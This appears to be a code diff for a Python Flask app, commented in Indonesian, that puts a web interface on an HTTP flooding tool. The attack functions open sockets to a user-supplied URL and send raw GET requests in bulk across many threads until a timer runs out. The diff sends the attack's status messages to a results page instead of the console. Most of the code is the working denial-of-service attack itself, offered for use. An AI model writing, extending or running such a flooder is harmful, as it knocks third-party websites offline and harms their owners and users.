@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect, url_for, flash
 import os
 import threading
 import time
@@ -9,26 +9,24 @@ from urllib.parse import urlparse
 import datetime
 from sys import stdout
 from colorama import Fore, init
+import subprocess
 
 # Inisialisasi Flask
 app = Flask(__name__)
+app.secret_key = 'your_secret_key'  # Ganti dengan kunci yang aman
 
 # Colors
 M2 = "[#FF0000]"  # MERAH
 H2 = "[#00FF00]"  # HIJAU
 K2 = "[#FFFF00]"  # KUNING
 
-# Clear console
-def clear():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
 # Attack function
-def attackSTELLAR(url, timer, threads):
+def attackSTELLAR(url, timer, threads, output_list):
     for _ in range(threads):
-        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
+        threading.Thread(target=LaunchSTELLAR, args=(url, timer, output_list)).start()
 
 # Attack process
-def LaunchSTELLAR(url, timer):
+def LaunchSTELLAR(url, timer, output_list):
     end_time = time.time() + timer
     req = (
         f"GET / HTTP/1.1\r\nHost: {urlparse(url).netloc}\r\n"
@@ -53,23 +51,23 @@ def LaunchSTELLAR(url, timer):
                 for _ in range(100):
                     s.send(req.encode())
             except Exception as e:
-                print(f"{M2}Terjadi kesalahan saat mengirim permintaan: {e}")
+                output_list.append(f"Terjadi kesalahan saat mengirim permintaan: {e}")
             finally:
                 s.close()
         except Exception as e:
-            print(f"{M2}Kesalahan koneksi: {e}")
+            output_list.append(f"Kesalahan koneksi: {e}")
 
 # Countdown function
-def countdown(t):
+def countdown(t, output_list):
     until = datetime.datetime.now() + datetime.timedelta(seconds=t)
     while True:
         remaining_time = (until - datetime.datetime.now()).total_seconds()
         if remaining_time > 0:
             stdout.flush()
-            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Status serangan => {remaining_time:.2f} detik tersisa ")
+            output_list.append(f"Status serangan => {remaining_time:.2f} detik tersisa ")
         else:
             stdout.flush()
-            stdout.write(f"\r {Fore.MAGENTA}•{Fore.WHITE} Serangan selesai!\n")
+            output_list.append("Serangan selesai!")
             return
 
 # Route untuk halaman utama
@@ -86,15 +84,20 @@ def run_script():
 
     # Validasi input
     if not target or thread <= 0 or time_duration <= 0:
-        return "Input tidak valid, silakan coba lagi."
+        flash("Input tidak valid, silakan coba lagi.")
+        return redirect(url_for('index'))
+
+    # List untuk menyimpan output
+    output_list = []
 
     # Jalankan serangan
-    threading.Thread(target=attackSTELLAR, args=(target, time_duration, thread)).start()
-    countdown_thread = threading.Thread(target=countdown, args=(time_duration,))
+    threading.Thread(target=attackSTELLAR, args=(target, time_duration, thread, output_list)).start()
+    countdown_thread = threading.Thread(target=countdown, args=(time_duration, output_list))
     countdown_thread.start()
     countdown_thread.join()
 
-    return redirect(url_for('index'))
+    # Kirim output ke halaman HTML
+    return render_template('result.html', output=output_list)
 
 # Entry point untuk menjalankan Flask
 if __name__ == '__main__':
